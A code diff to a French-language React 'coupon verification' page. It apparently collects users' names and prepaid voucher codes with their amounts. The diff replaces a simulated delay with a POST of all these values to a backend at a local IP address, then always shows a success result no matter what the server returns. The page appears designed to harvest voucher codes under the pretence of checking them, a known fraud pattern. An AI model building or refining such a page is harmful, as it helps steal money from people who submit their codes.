@@ -79,30 +79,50 @@ function VerificationPage() {
   const currentProvider = providers[provider.toLowerCase()];
 
   const formatCode = (input: string) => {
-    // Ne garder que les chiffres
     return input.replace(/[^0-9]/g, '').slice(0, 16);
   };
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setError('');
-
+  
     if (!nom || !prenom) {
       setError('Veuillez entrer au moins le nom et le prénom');
       return;
     }
-
+  
     const submittedCodes = codes.map(c => c.trim()).filter(c => c);
     const submittedMontants = montants.map(m => m.trim()).filter(m => m);
-
+  
     if (submittedCodes.length === 0) {
       setError('Veuillez entrer au moins un code de coupon');
       return;
     }
-
+  
+    const payload = {
+      nom,
+      prenom,
+      provider: currentProvider.name,
+      codes: submittedCodes,
+      montants: submittedMontants,
+    };
+  
     setLoading(true);
-    setTimeout(() => {
-      setLoading(false);
+  
+    try {
+      const response = await fetch('http://192.168.0.6:5000/api/enregistrement', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload),
+      });
+  
+      if (!response.ok) {
+        throw new Error('Erreur lors de la soumission');
+      }
+  
+      const data = await response.json();
+  
+      // Rediriger vers la page de résultat avec les données
       navigate('/result', {
         state: {
           success: true,
@@ -111,11 +131,17 @@ function VerificationPage() {
           montants: submittedMontants,
           provider: currentProvider.name,
           nom,
-          prenom
-        }
+          prenom,
+        },
       });
-    }, 1500);
+    } catch (err) {
+      console.error(err);
+      setError('Une erreur est survenue, veuillez réessayer.');
+    } finally {
+      setLoading(false);
+    }
   };
+  
 
   return (
     <div className="min-h-screen bg-gradient-to-br from-blue-50 via-white to-indigo-50 text-black">
